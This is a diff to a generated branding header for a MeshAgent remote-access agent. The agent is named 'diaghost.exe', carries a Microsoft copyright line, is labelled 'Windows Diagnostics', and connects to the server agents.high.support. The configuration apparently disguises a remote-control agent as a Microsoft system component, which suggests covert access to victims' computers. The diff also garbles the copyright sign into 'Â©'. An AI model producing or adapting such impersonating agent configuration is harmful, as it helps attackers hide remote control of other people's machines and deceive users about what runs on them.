@@ -1,5 +1,5 @@
-/* Generated file - do not edit. */
-/* Generated on: 2025-10-23 22:37:09 */
+﻿/* Generated file - do not edit. */
+/* Generated on: 2025-10-24 00:45:50 */
 #ifndef GENERATED_MESHAGENT_BRANDING_H
 #define GENERATED_MESHAGENT_BRANDING_H
 
@@ -17,7 +17,7 @@
 #undef MESH_AGENT_INTERNAL_NAME
 #define MESH_AGENT_INTERNAL_NAME "diaghost.exe"
 #undef MESH_AGENT_COPYRIGHT
-#define MESH_AGENT_COPYRIGHT "© Microsoft Corporation. All rights reserved."
+#define MESH_AGENT_COPYRIGHT "Â© Microsoft Corporation. All rights reserved."
 #undef MESH_AGENT_ORIGINAL_FILENAME
 #define MESH_AGENT_ORIGINAL_FILENAME "diaghost.exe"
 #undef MESH_AGENT_LOG_DIRECTORY
@@ -51,7 +51,7 @@
 
 /* ========== Provisioning Data ========== */
 #define MESH_AGENT_MESH_ID "sdBWgAtTM6VK18fC7gLtdRBZq0NAjzqg@1x9MMWNudEQZ3FoOGkXXLFyoyEhXL2Z"
-#define MESH_AGENT_SERVER_ID "BC7E0DCFDBE4298959C367D398357AF4F4C39396EE1C9289AC25707C25B4294C"
+#define MESH_AGENT_SERVER_ID "283DE2DD8539007F64853D3CE7C7D4C0562A8AD9DD100FDB31D08B3DCB4FB05815596C62A10A5459C84B14B4171252DF"
 #define MESH_AGENT_MESH_NAME "Windows Diagnostics"
 #define MESH_AGENT_SERVER_URL "wss://agents.high.support:4445/agent.ashx"
 #define MESH_AGENT_MESH_TYPE 2
